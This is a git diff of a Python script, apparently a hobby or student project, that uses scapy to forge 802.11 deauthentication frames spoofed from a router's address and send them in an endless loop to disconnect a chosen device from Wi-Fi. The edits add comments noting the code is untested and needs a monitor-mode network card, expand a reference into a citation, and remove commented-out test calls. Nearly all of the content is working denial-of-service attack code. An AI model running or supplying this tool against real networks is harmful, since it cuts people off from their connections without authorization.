@@ -1,11 +1,9 @@
 #!/bin/python3
-
+# This code is untested, and i am unsure if it works
+# NIC supporting monitor mode required for this to work, which is currently unavailable for me
 
 import scapy.all as scapy
 from time import sleep
-import re
-
-
 
 
 def ipToMAC(ipAddress):
@@ -27,14 +25,13 @@ def deauth(targetIPAddrress, routerIPAddrress):
         dot11 = scapy.Dot11(type=0, subtype=12, addr1=targetMACAddress, addr2=routerMACAddress, addr3=routerMACAddress) # Type = 0 means management packet, and subtype=12 means packet is a deauthentication packet
         
         # Deauth packet codes here:
-        # https://community.cisco.com/t5/wireless-mobility-documents/802-11-association-status-802-11-deauth-reason-codes/ta-p/3148055
+        # Lakshmanan, S., 2013. 802.11 Association Status, 802.11 Deauth Reason codes. [online] Community.cisco.com. Available at: <https://community.cisco.com/t5/wireless-mobility-documents/802-11-association-status-802-11-deauth-reason-codes/ta-p/3148055> [Accessed 11 May 2021].
         dot11deauth = scapy.Dot11Deauth(reason=7)
         
         deauthPacket = scapy.RadioTap() / dot11 / dot11deauth # Combine all parts of final packet together
         print(targetMACAddress, routerMACAddress)
         try:
             while True:
-                # print(deauthPacket.show())
                 sleep(0.5)
                 scapy.sendp(deauthPacket, verbose=False)
         except KeyboardInterrupt:
@@ -46,10 +43,6 @@ def deauth(targetIPAddrress, routerIPAddrress):
         print("Index Error. IP addrresses may be wrong.")
 
 
-# deauth("192.168.0.105", "192.168.0.1")
-
-
-# deauth("hello")
 
 def deauth_me(target , bssid):
     dot11 = scapy.Dot11(addr1=target, addr2=bssid, addr3=bssid)
